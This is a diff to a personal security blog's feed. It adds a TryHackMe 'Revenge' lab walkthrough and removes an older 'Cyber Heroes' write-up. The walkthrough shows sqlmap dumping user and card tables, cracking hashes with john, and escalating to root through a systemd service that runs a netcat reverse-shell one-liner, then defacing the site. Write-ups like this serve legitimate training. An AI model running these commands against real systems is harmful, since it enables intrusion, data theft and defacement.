@@ -1,4 +1,206 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-08T18:18:47+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">TryHackMe - Olympus</title><link href="http://localhost:4000/tryhackme-olympus/" rel="alternate" type="text/html" title="TryHackMe - Olympus" /><published>2023-07-08T00:00:00+03:00</published><updated>2023-07-08T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-olympus</id><content type="html" xml:base="http://localhost:4000/tryhackme-olympus/"><![CDATA[<p>Hey!</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-10T20:02:06+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">TryHackMe - Revenge</title><link href="http://localhost:4000/tryhackme-revenge/" rel="alternate" type="text/html" title="TryHackMe - Revenge" /><published>2023-07-10T00:00:00+03:00</published><updated>2023-07-10T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-revenge</id><content type="html" xml:base="http://localhost:4000/tryhackme-revenge/"><![CDATA[<p>You’ve been hired by Billy Joel to get revenge on Ducky Inc…the company that fired him. Can you break into the server and complete your mission?</p>
+
+<p>Created by <a href="https://tryhackme.com/p/Nameless0ne">Nameless0ne</a></p>
+
+<p><br /></p>
+
+<p><img src="/assets/img/tryhackme/revenge/duck.jpg" alt="duck" /></p>
+
+<p>This is revenge! You’ve been hired by Billy Joel to break into and deface the Rubber Ducky Inc. webpage. He was fired for probably good reasons but who cares, you’re just here for the money. Can you fulfill your end of the bargain?</p>
+
+<p>There is a sister room to this one. If you have not completed <a href="https://tryhackme.com/room/blog">Blog</a> yet, I recommend you do so. It’s not required but may enhance the story for you.</p>
+
+<p>All images on the webapp, including the navbar brand logo, 404 and 500 pages, and product images goes to <a href="https://tryhackme.com/p/Varg">Varg</a>. Thanks for helping me out with this one, bud.</p>
+
+<p>Please hack responsibly. Do not attack a website or domain that you do not own the rights to. TryHackMe does not condone illegal hacking. This room is just for fun and to tell a story.</p>
+
+<p><br /></p>
+
+<h3 id="flag-1">Flag 1</h3>
+
+<p><code class="language-plaintext highlighter-rouge">Billy</code> sends us a note. Let’s look at what says to us.</p>
+
+<p><img src="/assets/img/tryhackme/revenge/billy.png" alt="billy" /></p>
+
+<p>He gives us a <code class="language-plaintext highlighter-rouge">mission</code>. We must <code class="language-plaintext highlighter-rouge">penetrate a server</code> and <code class="language-plaintext highlighter-rouge">change the front page</code>.</p>
+
+<p>Let’s <code class="language-plaintext highlighter-rouge">begin</code>.</p>
+
+<p>First, let’s do a <code class="language-plaintext highlighter-rouge">Nmap</code> scan to gather information about the target.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.202.34
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/revenge/nmap.png" alt="nmap" /></p>
+
+<p>As you can see <code class="language-plaintext highlighter-rouge">22/tcp and 80/tcp</code> ports are open.</p>
+
+<p>Let’s explore the website.</p>
+
+<p>Here is a <code class="language-plaintext highlighter-rouge">homepage</code>.</p>
+
+<p><img src="/assets/img/tryhackme/revenge/home.png" alt="home" /></p>
+
+<p>Let’s do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.202.34/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/revenge/gobuster.png" alt="gobuster" /></p>
+
+<p>We found a lot of pages. Let’s explore all of them.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">/contact:</code></strong> Upon examining the page, we don’t find anything particularly interesting.</p>
+
+<p><img src="/assets/img/tryhackme/revenge/contact.png" alt="contact" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">/product:</code></strong> It looks like there are <code class="language-plaintext highlighter-rouge">four products</code>.</p>
+
+<p><img src="/assets/img/tryhackme/revenge/products.png" alt="products" /></p>
+
+<p>Let’s examine these products.</p>
+
+<p><img src="/assets/img/tryhackme/revenge/product-1.png" alt="product-1" /></p>
+
+<p>We discover an <code class="language-plaintext highlighter-rouge">endpoint (/product/1)</code> that could be vulnerable to <code class="language-plaintext highlighter-rouge">SQL injection</code>.</p>
+
+<p>To confirm this, we modify the endpoint to <code class="language-plaintext highlighter-rouge">/product/2-1</code> and check if we are <code class="language-plaintext highlighter-rouge">still on the /product/1 page</code>.</p>
+
+<p><img src="/assets/img/tryhackme/revenge/detect.png" alt="detect" /></p>
+
+<p>Indeed, the page is vulnerable to SQL injection.</p>
+
+<p>Let’s do a <code class="language-plaintext highlighter-rouge">sqlmap</code> scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -u http:/10.10.202.34/product/1 --dbs
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/revenge/dbs.png" alt="dbs" /></p>
+
+<p>We found the <code class="language-plaintext highlighter-rouge">duckyinc database</code>. Let’s examine this database.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -u http:/10.10.202.34/product/1 -D duckyinc --tables
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/revenge/tables.png" alt="tables" /></p>
+
+<p>Let’s dump <code class="language-plaintext highlighter-rouge">system_user</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -u http:/10.10.202.34/product/1 -D duckyinc -T system_user --dump
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/revenge/system.png" alt="system" /></p>
+
+<p>We find <code class="language-plaintext highlighter-rouge">three users</code> and their corresponding <code class="language-plaintext highlighter-rouge">hashes</code>.</p>
+
+<p>Let’s dump the <code class="language-plaintext highlighter-rouge">user table</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -u http:/10.10.202.34/product/1 -D duckyinc -T user --dump
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/revenge/user.png" alt="user" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">Well done!</code> We find the <code class="language-plaintext highlighter-rouge">first flag</code> which happens to be <code class="language-plaintext highlighter-rouge">Mandrews' credit card number</code>.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">/login:</code></strong></p>
+
+<p><img src="/assets/img/tryhackme/revenge/login.png" alt="login" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">/admin:</code></strong></p>
+
+<p><img src="/assets/img/tryhackme/revenge/admin.png" alt="admin" /></p>
+
+<p><br /></p>
+
+<h3 id="flag-2">Flag 2</h3>
+
+<p>Now, let’s <code class="language-plaintext highlighter-rouge">crack the all hashes</code>.</p>
+
+<p><img src="/assets/img/tryhackme/revenge/all.png" alt="all" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --wordlist=/usr/share/wordlists/rockyou.txt allhash.hash
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/revenge/john.png" alt="john" /></p>
+
+<p>We find <code class="language-plaintext highlighter-rouge">two passwords</code>. One for the <code class="language-plaintext highlighter-rouge">server-admin</code> and another for the <code class="language-plaintext highlighter-rouge">dgorman</code>.</p>
+
+<p><img src="/assets/img/tryhackme/revenge/result.png" alt="result" /></p>
+
+<p>We try to use these passwords on the <code class="language-plaintext highlighter-rouge">login and admin pages</code>, but they <code class="language-plaintext highlighter-rouge">don't work</code>.</p>
+
+<p>Let’s try these on <code class="language-plaintext highlighter-rouge">ssh</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh server-admin@10.10.202.34
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/revenge/ssh.png" alt="ssh" /></p>
+
+<p>Yes, it is work. We are in the server now.</p>
+
+<p>Let’s get the <code class="language-plaintext highlighter-rouge">flag 2</code>.</p>
+
+<p><img src="/assets/img/tryhackme/revenge/flag-2.png" alt="flag-2" /></p>
+
+<p><br /></p>
+
+<h3 id="flag-3">Flag 3</h3>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Hint: Mission objectives</code></strong></p>
+
+<p>Now, we need to <code class="language-plaintext highlighter-rouge">escalate our privileges</code>. We start by running the <strong><code class="language-plaintext highlighter-rouge">sudo -l</code></strong> command.</p>
+
+<p><img src="/assets/img/tryhackme/revenge/sudo-l.png" alt="sudo-l" /></p>
+
+<p>Which shows that we can <code class="language-plaintext highlighter-rouge">execute duckyinc.service</code> with root privileges. We examine the contents of this file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudoedit /etc/systemd/system/duckyinc.service
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/revenge/service.png" alt="service" /></p>
+
+<p>We need to change this file.</p>
+
+<p>First, let’s create a <code class="language-plaintext highlighter-rouge">shell.sh</code> and write in this code. (Making Sure to <code class="language-plaintext highlighter-rouge">Change the IP and Port</code> as Necessary)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 4444 &gt;/tmp/f
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/revenge/shell.png" alt="shell" /></p>
+
+<p>Let’s <code class="language-plaintext highlighter-rouge">change the content of the duckyinc.servise</code> file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User=root
+Group=root
+ExecStart=/bin/bash /home/server-admin/shell.sh
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/revenge/service-2.png" alt="service-2" /></p>
+
+<p>Now we need it set up a <code class="language-plaintext highlighter-rouge">netcat listener</code>. Then we can <code class="language-plaintext highlighter-rouge">run</code> the duckyinc.service.</p>
+
+<p><img src="/assets/img/tryhackme/revenge/get-root.png" alt="get-root" /></p>
+
+<p>Success! We now have <code class="language-plaintext highlighter-rouge">root access</code>.</p>
+
+<p><img src="/assets/img/tryhackme/revenge/root.png" alt="root" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">Remember</code> the mission. We must <code class="language-plaintext highlighter-rouge">change the front page</code> for the root flag.</p>
+
+<p>I changed the <code class="language-plaintext highlighter-rouge">index.html</code> location on the server.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ mv /var/www/duckyinc/templates/index.html
+</code></pre></div></div>
+
+<p>Now, we can get the <code class="language-plaintext highlighter-rouge">root flag</code>.</p>
+
+<p><img src="/assets/img/tryhackme/revenge/root-flag.png" alt="root-flag" /></p>
+
+<p><br /></p>
+
+<p><code class="language-plaintext highlighter-rouge">Congratulations!</code> We have successfully completed the steps to find all the flags. It was nice CTF. I hope you learned something and had fun. But that’s it for now till next time take care :wave:</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="security,sqlmap, real-world, enumeration" /><summary type="html"><![CDATA[You’ve been hired by Billy Joel to get revenge on Ducky Inc…the company that fired him. Can you break into the server and complete your mission?]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/revenge.png" /><media:content medium="image" url="http://localhost:4000/assets/img/revenge.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Olympus</title><link href="http://localhost:4000/tryhackme-olympus/" rel="alternate" type="text/html" title="TryHackMe - Olympus" /><published>2023-07-08T00:00:00+03:00</published><updated>2023-07-08T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-olympus</id><content type="html" xml:base="http://localhost:4000/tryhackme-olympus/"><![CDATA[<p>Hey!</p>
 
 <p>Start the VM here and start enumerating! The machine can take some time to start. Please allow up to 5 minutes (Sorry for the inconvenience). Bruteforcing against any login page is out of scope and should not be used.</p>
 
@@ -214,7 +416,7 @@ $ ssh -i zeus.rsa zeus@10.10.35.164
 
 <h3 id="what-is-flag-4">What is Flag 4?</h3>
 
-<p><strong><code class="language-plaintext highlighter-rouge">The flag is located in /etc/</code></strong></p>
+<p><strong><code class="language-plaintext highlighter-rouge">Hint: The flag is located in /etc/</code></strong></p>
 
 <p>According to <code class="language-plaintext highlighter-rouge">hint</code>, the last flag is <code class="language-plaintext highlighter-rouge">located in /etc</code>. We can search for it using <code class="language-plaintext highlighter-rouge">grep</code>.</p>
 
@@ -1467,7 +1669,7 @@ $ john --wordlist=usr/share/wordlists/rockyou.txt hash.hash
   <li><a href="https://tryhackme.com/room/zeno">TryHackMe - Zeno</a></li>
   <li><a href="https://tryhackme.com/room/sqhell">TryHackMe - SQHell</a> - <a href="https://mr0wido.github.io/tryhackme-sqhell/">My Writeup :punch:</a></li>
   <li><a href="https://tryhackme.com/room/olympusroom">TryHackMe - Olympus</a> - <a href="https://mr0wido.github.io/tryhackme-olympus/">My Writeup :punch:</a></li>
-  <li><a href="https://tryhackme.com/room/revenge">TryHackMe - Revenge</a></li>
+  <li><a href="https://tryhackme.com/room/revenge">TryHackMe - Revenge</a> - <a href="https://mr0wido.github.io/tryhackme-revenge/">My Writeup :punch:</a></li>
   <li><a href="https://tryhackme.com/room/metamorphosis">TryHackMe - Metamorphosis</a></li>
   <li><a href="https://tryhackme.com/room/wwbuddy">TryHackMe - WWBuddy</a></li>
   <li><a href="https://tryhackme.com/room/unstabletwin">TryHackMe - Unstable Twin</a></li>
@@ -1546,67 +1748,4 @@ $ john --wordlist=usr/share/wordlists/rockyou.txt hash.hash
 
 <p><br />
 <br />
-I hope you liked my article. See you in my other articles:hand:</p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="Guide" /><category term="sql injection, sqli guide" /><summary type="html"><![CDATA[In this article, I intended to explain SQL injection in the most basic and most easily understandable way. Because the resources, I tried to learn were often too detailed for the beginner level and not very clear for the beginner level. So, I preferred a shorter and clearer explanation.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/sqli.png" /><media:content medium="image" url="http://localhost:4000/assets/img/sqli.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Cyber Heroes</title><link href="http://localhost:4000/tryhackme-cyber-heroes/" rel="alternate" type="text/html" title="TryHackMe - Cyber Heroes" /><published>2023-03-30T00:00:00+03:00</published><updated>2023-03-30T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-cyber-heroes</id><content type="html" xml:base="http://localhost:4000/tryhackme-cyber-heroes/"><![CDATA[<p>Want to be a part of the elite club of CyberHeroes? Prove your merit by finding a way to log in!</p>
-
-<p><br /></p>
-
-<h2 id="1-cyberheroes">1. CyberHeroes</h2>
-
-<p><br /></p>
-
-<h3 id="11-uncover-the-flag">1.1 Uncover the flag!</h3>
-
-<p>Let’s do a nmap scan.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.39.168
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/cyber-heroes/nmap.png" alt="nmap" /></p>
-
-<p>Two ports are open. Theese are <code class="language-plaintext highlighter-rouge">22/tcp SSH and 80/tcp HTTP</code>.</p>
-
-<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>
-
-<p>I found three pages on the website. These are <code class="language-plaintext highlighter-rouge">Home, About, and Login</code>.</p>
-
-<p>Let’s look at them all.</p>
-
-<ul>
-  <li>
-    <p><em><strong><code class="language-plaintext highlighter-rouge">Home</code></strong></em></p>
-
-    <p><img src="/assets/img/tryhackme/cyber-heroes/home.png" alt="home" /></p>
-
-    <p>I check the source page but I don’t see anything significant.</p>
-  </li>
-  <li>
-    <p><em><strong><code class="language-plaintext highlighter-rouge">About</code></strong></em></p>
-
-    <p>I don’t see anything significant on the page.</p>
-  </li>
-  <li>
-    <p><em><strong><code class="language-plaintext highlighter-rouge">Login</code></strong></em></p>
-
-    <p><img src="/assets/img/tryhackme/cyber-heroes/login.png" alt="login" /></p>
-
-    <p>I check the source page and I found this script.</p>
-
-    <p><img src="/assets/img/tryhackme/cyber-heroes/source.png" alt="source" /></p>
-
-    <p>As I understand it <code class="language-plaintext highlighter-rouge">username: h3ck3rBoi</code> and <code class="language-plaintext highlighter-rouge">password: RevereString("*****@t*****r****")</code>.</p>
-
-    <p>We need to write the password in reverse. So, <code class="language-plaintext highlighter-rouge">password: S****S*****@*****</code></p>
-  </li>
-</ul>
-
-<p>Now that we’ve found the username and password, let’s log in.</p>
-
-<p>And the flag is here.</p>
-
-<p><img src="/assets/img/tryhackme/cyber-heroes/flag.png" alt="flag" /></p>
-
-<p><br /></p>
-
-<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
-
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="ctf, security, credential" /><summary type="html"><![CDATA[Want to be a part of the elite club of CyberHeroes? Prove your merit by finding a way to log in!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/cyber-heroes.png" /><media:content medium="image" url="http://localhost:4000/assets/img/cyber-heroes.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+I hope you liked my article. See you in my other articles:hand:</p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="Guide" /><category term="sql injection, sqli guide" /><summary type="html"><![CDATA[In this article, I intended to explain SQL injection in the most basic and most easily understandable way. Because the resources, I tried to learn were often too detailed for the beginner level and not very clear for the beginner level. So, I preferred a shorter and clearer explanation.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/sqli.png" /><media:content medium="image" url="http://localhost:4000/assets/img/sqli.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
